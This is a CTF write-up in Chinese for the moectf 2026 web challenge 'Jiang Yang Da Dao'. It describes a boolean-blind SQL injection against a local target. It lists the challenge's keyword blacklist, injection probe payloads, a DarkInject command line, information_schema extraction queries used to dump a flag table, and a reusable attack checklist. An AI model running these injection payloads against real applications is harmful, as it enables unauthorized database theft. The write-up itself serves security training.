# moectf 2026 · Web 安全与渗透测试 ·「江洋大盗」—— 解题记录

- 比赛：**moectf 2026**
- 方向：**Web 安全与渗透测试**
- 题目：**江洋大盗**
- 目标：`http://127.0.0.1:19643/`（题目外层包装为「网信院往年试题检索系统」）
- 请求：`POST /` ，表单 `id=1`
- 服务器：`ArchiveQuery/2.0 Python/3.9.25`
- 工具：`DarkInject` v1.2.0

---

## 题目附加条件

原题给定的过滤清单，逐字照录如下（仓库内同名文件：`lab/blacklist_ctf.txt`）：

```python
BLACKLIST = [
    "union",
    "sleep",
    "benchmark",
    "get_lock",
    "release_lock",
    "extractvalue",
    "updatexml",
    "load_file",
    "outfile",
    "dumpfile",
    " into ",
    "insert",
    "update",
    "delete",
    "drop",
    "alter",
    "create",
    "replace",
    "truncate",
    "handler",
    "procedure",
    "--",
    "/*",
    "*/",
    "#",
    ";",
]
```

语义为**命中即拦**（presence），不做替换：请求中出现任一 token 即被拒绝，
大小写混写、关键字嵌套（如 `ununionion`）均无法绕过。

---

## 1. 侦察

| 试探 | 结果 | 说明 |
|------|------|------|
| `id=1` | 回显 1 行（林舟 / 高等数学） | 正常 |
| `id=1 AND 1=1` | 有行 | **可注入** |
| `id=1 AND 1=2` | 无行 | 布尔可用 |
| `id=1'` | 无行 | **不是字符串型**（加引号反而语法错）→ 数字型：`WHERE id=$id` |
| `id=1 OR 1=1` | 回显 5 行 | 没有 `LIMIT`，WHERE 命中的全回显 |
| `id=1 order by 3` / `order by 4` | 真 / 假 | **表 3 列** |
| `id=1 AND (select 1)` | 真 | `select` 可用 |

错误一律被吞成「没有找到匹配记录」，**不回显 SQL、不回显报错**。

## 2. 过滤清单（命中即拦 / presence）

即上面的**题目附加条件**，实测逐项确认：

- **注释符**：`--` `#` `/*` → 所有「注释收尾」写法全废，payload 必须无注释
- **`union`**：大小写混写、`ununionion` 嵌套都无效 → 是 **presence** 不是 strip
- **延时**：`sleep` / `benchmark` / `get_lock` 全部 < 1s → 时间盲注废
- **报错**：`extractvalue` / `updatexml` → 且错误不回显，报错注入废
- **文件/系统表**：`load_file`、`mysql.user`
- 可用：`select/from/where/limit/order/by/and/or`、`substr/ascii/ord/length/concat/group_concat`、
  `version()/database()/current_user()/session_user()`、`information_schema`

> **结论：只有布尔盲注（B）可行。**

## 3. 结构

```
库: past_paper
表: public_subjects / past_paper / flag_table
flag_table(id, flag)   -- 只有 1 行
```

## 4. 打通命令

```bash
cd darkinject
PY=python          # 换成你自己的解释器路径即可

# 起手：自动识别 numeric + mysql，并在黑名单下自动降级到布尔盲注
# （没有 --no-legal 了，首次要手动输入 I AGREE）
# --blacklist 指向原题附加条件；lab/blacklist_moectf.txt 是实测整理版，拦截语义相同。
$PY main.py -u "http://127.0.0.1:19643/" --method POST --data "id=1" --param id \
    --blacklist lab/blacklist_ctf.txt --db past_paper --no-banner --charset flag
```

进入 `>>>` 后（用 `expr` + `GROUP_CONCAT`，比逐行 `tables` 快几十倍）：

```
>>> expr (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())
  [+] flag_table,past_paper,public_subjects

>>> expr (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name=0x666c61675f7461626c65)
  [+] id,flag

>>> expr (SELECT GROUP_CONCAT(flag) FROM flag_table)
  [+] moectf{...}
```

> `0x666c61675f7461626c65` 是 `flag_table` 的十六进制——数字型注入点不能用引号，
> 所以字符串常量统一写成 `0x...`。

## 5. FLAG

```
moectf{<66 字符，已脱敏>}
```

- 格式：`moectf{` + 66 字符 + `}`，总长 **74**
- SHA-256 指纹（前 12 位）：`8e688be2d83c` —— 可用它校验你本地复现拿到的 flag 是否一致
- 内容为一句话，这里不转写（转写等于把 flag 交出去）

> 公开版本**不保留明文 flag**：一来避免直接公开赛事答案，二来避免被当作「针对真实目标做攻击」的佐证材料。
> 仓库内其他位置（如上面的 `expr` 输出示例）同样只出现 `moectf{...}` 占位。

（用时 ~4 分钟；工具输出与「全区间二分 0..127 + 整串等值」的 ground truth 完全一致）

## 6. 复盘：这轮踩到的两个坑

1. **盲注字符集静默截断**
   字符集里没有的字符，二分返回「不超过它的最近字符」，**不会报错**：
   flag 里的 `+`(43) 被读成 `*`(42)，`|`(124) 被读成 `{`(123)。
   → 修：扩大 `flag` 预设字符集；并在提取后加**整串差分校验**，不一致就告警。

2. **单票判定翻错字符**
   `test_votes=1` 时一次偶发抖动就把 `C`(67) 读成 `@`(64)。
   → 修：默认恢复 2 票；平票再补投最多 2 票；判票要求长度差 > margin。

3. **性能**：靶子单请求 ~0.23s，74 字符原本要 ~10 分钟。
   → 修：**必假样本长度缓存**（假样本响应长度只取决于 payload 文本长度，同位置恒定），
   每次判定 2 请求 → 1 请求，耗时减半。

## 7. 下次打 SQL 类靶子的固定动作

1. `1 AND 1=1` / `1 AND 1=2` → 判可注入性 + 数字/字符型
2. `order by N` → 定列数
3. 探关键字：注释符、`union`、延时、报错函数（顺便判断 presence 还是 strip）
4. 能 union 就 union；否则布尔盲注（`--db <库名>` 跳过库名盲注）
5. **用 `expr` + `GROUP_CONCAT` 抽结构/数据**，不要用逐行 `tables`
6. 拿到疑似 flag **必须复核**：逐位 `ASCII(SUBSTR(...))=ord` 等值，或重抽一遍对比

---

## 附：本题相关文件

| 文件 | 说明 |
|------|------|
| `lab/blacklist_ctf.txt` | **原题附加条件**，逐字照录，未作改动（仅加了顶部出处注释） |
| `lab/blacklist_moectf.txt` | 实测整理版：可用 / 被拦关键字清单 + 靶场画像（Server、列数、回显行为） |
| `lab/vuln_app.py` | 同款黑名单的本地 SQLite 靶场，可在无网络环境下复现本题的过滤语义 |
| `lab/writeup_moectf_archive.md` | 本文 |

> 本地复现：`python lab/vuln_app.py --filter presence_i --port 8900`（`presence_i` = 命中即拦，
> 与本题语义一致），再用 `--blacklist lab/blacklist_ctf.txt` 跑本工具即可。
